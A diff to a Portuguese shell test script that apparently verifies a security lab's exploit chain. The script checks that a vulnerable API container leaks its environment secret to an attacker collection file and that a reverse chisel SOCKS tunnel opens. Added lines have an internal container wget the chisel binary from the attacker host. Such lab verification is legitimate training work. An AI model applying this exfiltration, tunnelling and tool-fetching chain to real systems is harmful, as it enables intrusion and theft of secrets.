@@ -118,6 +118,10 @@ verificar "o /v1 aceita o agendamento serializado" [ "$status" = 200 ]
 for _ in $(seq 1 30); do [ -s "$TRABALHO/coleta.txt" ] && grep -q "session" "$TRABALHO/chisel.log" && break; sleep 1; done
 verificar "o contêiner da API mandou o próprio ambiente para o atacante" grep -q "BRECHA_SEGREDO=$BRECHA_SEGREDO" "$TRABALHO/coleta.txt"
 verificar "o túnel SOCKS reverso abriu" grep -q "session" "$TRABALHO/chisel.log"
+gateway=$(docker network inspect bridge -f '{{(index .IPAM.Config 0).Gateway}}')
+# Controle da versão corrigida: o mesmo wget, do mesmo contêiner, aqui chega.
+com_saida() { "${LAB[@]}" exec -T banco wget -q -T 5 -O /dev/null "http://$gateway:9100/chisel"; }
+verificar "no laboratório, a rede interna tem saída para a máquina do atacante" com_saida
 
 echo
 echo "4. Enumeração com Nmap pelo túnel e pós-exploração"
